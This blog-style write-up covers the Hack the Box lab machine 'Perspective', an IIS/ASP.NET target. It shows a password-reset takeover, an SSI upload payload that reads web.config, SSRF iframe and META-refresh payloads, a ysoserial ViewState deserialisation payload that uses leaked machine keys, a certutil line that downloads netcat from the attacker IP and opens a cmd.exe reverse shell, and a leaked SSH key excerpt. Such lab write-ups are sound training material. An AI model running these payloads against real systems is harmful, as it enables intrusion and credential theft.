---
title: "Hack the Box - Perspective"
slug: "hack-the-box-perspective"
date: "2024-03-14"
excerpt: "Perspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application `web.config` file via a Server-Side Include, which is possible due to a weak filter on file upload. Having retrieved the application `machineKey`, a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the `ViewStateUserKey`. Remote command execution is then achieved via deserialisation of a malicious ViewState that can be forged using the obtained application keys. Finally, a padding oracle attack on an internal staging application running with administrative privileges allows to inject OS commands in an encrypted POST parameter, resulting in the elevation of privileges."
cover: "cover.png"
tags:
  - ASP.NET
  - SSRF
  - Deserialisation
  - Command Injection
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt perspective.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 d6:7f:3f:d4:22:15:ce:64:f3:c8:00:79:bf:f6:f8:f8 (RSA)
|   256 08:c6:d4:f3:98:84:0f:fd:4b:ed:e3:a6:25:bd:e7:70 (ECDSA)
|_  256 32:81:6a:8b:4d:f9:61:09:ff:d3:99:6c:e7:3f:a3:ac (ED25519)
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 4859E39AE6C0F1F428F2126A6BB32BD9
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Website

There is a website on port 80 hosted by IIS.

![](./20220806135532.png)  

I registered an account.

```text
testing@testing.com:password123!
```

On the support page we find the admin email address.

![](./20220806140735.png)  

## Initial Foothold

### Admin Password Reset

If we logout of the account we made, try using the forgot password function and intercept the request with Burp, we can swap out the temporary email address with the `admin@perspective.htb` one and reset it's password. Letting us login as them.

If we enter the temporary email address, click `Initiate Reset` enter the security questions for our temporary account while intercepting the request and changing email address the password we can reset it.

![](./20220806142159.png)  

```text
admin@perspective.htb:password123!
```

![](./20220806141956.png)  

We can now access the admin panel. If we enter our test username we have the option to generate a PDF.

![](./20220806142617.png)  

It prints a list of the user's products. We can try creating a malicious product to execute and access local files.

### XSS

Let's log back in as our testing account and create a new product. We can upload a product image, we'll create a malicious file, `product.shtml` to test for XSS and grab the `web.config` file.

```html
<!--#include file="../web.config"-->
```

Intercept the request with Burp and change the `Content-Type` header to `image/jpeg` to bypass any file type checks.

![](./20220806145415.png)  

The product is new created.

![](./20220806145450.png)  

If we view the source of the image in a new tab we can see the contents of the `web.config` file confirming that we in fact have XSS and can access internal resources.

![](./20220806145227.png)  

There's a reference to a local web server. Let's try loading this local web server to see what it hosts.

![](./20220806145753.png)  

We can create another file containing an `iframe` to load the website. If we try uploading the file itself we get a `Malicious input detected!` error. We can stage the payload instead.

```html
<iframe src="http://localhost:8000" height="1000px" width="1000px"></iframe>
```

Setup a python web server to load the html payload. We'll use another payload to load this file which we can find in an [XSS bypass list](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta). This also means we don't have to keep uploading new products, we can just update the `pwn.html` file contents and generate a new PDF.

```bash
python3 -m http.server 80
```

If we use the following payload in the description of the item and generate a PDF in the admin account we can see the page being loaded.

### Swagger API

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=http://10.10.16.5/pwn.html">
```

![](./20220806152828.png)  

We now know there's a swagger API endpoint on the `localhost:8000` web server. We can request the `swagger.json` file to get all API information.

```html
<iframe src="http://localhost:8000/swagger/v1/swagger.json" height="1000px" width="1000px"></iframe>
```

![](./20220806153751.png)  

### Decrypting Key

We can use the `/decrypt` endpoint to decrypt the key we found in the `web.config` file.

![](./20220806154019.png)  

We just have to post the key to the `/decrypt` endpoint in the following URL. Note the key is URL encoded.

```text
http://localhost:8000/decrypt?cipherTextRaw=ENC1%3a3UVxtz9jwPJWRvjdl1PfqXZTgg%3d%3d
```

We can update the `pwn.html` file to the following. The code will make a post request to `/decrypt` with the encrypted key. Then it will put the response in the `iframe`.

```html
<html>
    <body>
        <form action="http://localhost:8000/decrypt?cipherTextRaw=ENC1%3a3UVxtz9jwPJWRvjdl1PfqXZTgg%3d%3d" method="post" target="iframe"></form>
        <iframe name="iframe"></iframe>
        <script type="text/javascript">
            document.getElementsByTagName('FORM').submit();
        </script>
    </body>
</html>
```

We get the decrypted `ViewStateUserKey` back.

![](./20220806154713.png)  

```text
SAltysAltYV1ewSTaT3
```

### ViewState RCE

We can get RCE with enabled ViewState MAC validation as mentioned [here](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret#rce-with-enabled-viewstate-mac-validation).

We will use `ysoserial` in order to create a payload. We'll also need a few more things from the `web.config` file. 

```xml
<machineKey 
  compatibilityMode="Framework20SP2"
  validation="SHA1"
  decryption="AES
  validationKey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
  decryptionKey="B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9"
/>
```

We can use `certutil` to download `netcat` onto the target and execute it to get our reverse shell.

```powershell
certutil.exe -urlcache -split -f http://10.10.16.5/nc.exe c:\\windows\\tasks\\nc.exe && c:\\windows\\tasks\\nc.exe 10.10.16.5 9001 -e cmd.exe
```

We need one more bit of information, the `__VIEWSTATEGENERATOR` value from our intercepted request in Burp.

![](./20220806172842.png)  

### Generate Payload

Putting this together with all the values from the `web.config` and `ysoserial` we get the following.

```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "certutil.exe -urlcache -split -f http://10.10.16.5/nc.exe c:\\windows\\tasks\\nc.exe && c:\\windows\\tasks\\nc.exe 10.10.16.5 9001 -e cmd.exe" --validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3" --generator "DD9C14DD" --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
```

![](./20220806172551.png)  

Setup a `netcat` listener.

```bash
rlwrap nc -lnvp 9001
```

Then copy and replace the `__VIEWSTATE` value with the payload we just generated and forward the request. Make sure to URL encode it, you can use `CTRL + U` in Burp.

![](./20220806173039.png)  

We get a hit on our web server and get our shell!

![](./20220806173118.png)  

### User.txt

```powershell
type user.txt && ipconfig
```

![](./20220806172138.png)  

## Privilege Escalation

### Enumeration

Let's start by enumerating the target using `winpeas`.

```powershell
certutil.exe -urlcache -split -f http://10.10.16.5/winpeas.exe winpeas.exe
```

We don't get anything too interesting but we do find ssh keys. We can use this for a more stable shell.

![](./20220806174257.png)  

### SSH

Retrieve the `id_rsa`.

```powershell
type C:\Users\webuser\.ssh\id_rsa
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzfoQwqu9tIYiy694HbGmT+qw2b+kUTnEcqEOEXv5+vLcVqZ2
APlHTSDj4rSzv+tJoHQiRf3IyVpNNqGw8+wM+P3wdozY66BUPHqz6FpRHxcMT2Ss
Nk9J9hxTi2L3oBVR83F0abBWnOClOqjrd8SMVRcyCi1/svSdOP8OPh9s+mpa5...
```

```bash
chmod 600 id_rsa
ssh -i id_rsa webuser@perspective.htb
```

![](./20220806174546.png)  

Unfortunately I'm not smart enough to figure out the rest... Some have said that it contains a heap of cryptography, which I **SUCK** at.